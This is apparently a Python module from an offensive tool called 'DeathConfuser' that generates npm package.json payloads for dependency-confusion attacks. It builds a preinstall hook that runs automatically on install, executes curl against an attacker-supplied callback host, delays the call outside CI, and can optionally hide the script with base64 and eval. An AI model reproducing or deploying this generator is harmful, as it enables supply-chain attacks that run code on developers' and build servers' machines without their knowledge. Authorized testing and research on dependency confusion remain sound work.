"""NPM payload generation utilities."""
from __future__ import annotations

import base64
from typing import Optional

from ...payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(script: str, method: Optional[str]) -> str:
    if method == "b64":
        encoded = base64.b64encode(script.encode()).decode()
        return f"node -e eval(Buffer.from('{encoded}','base64').toString())"
    return script


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a package.json payload with a preinstall callback."""

    preinstall = (
        "const e=require('child_process').exec;"
        f"const c=()=>e('curl -m5 {callback}');"
        "if(process.env.CI)c();else setTimeout(c,3000);"
    )
    script = _encode(f"node -e \"{preinstall}\"", encode)
    return builder.render(
        "npm_package.json.j2",
        package_name=package,
        version="0.0.1",
        description="DeathConfuser payload",
        payload_code=script,
    )
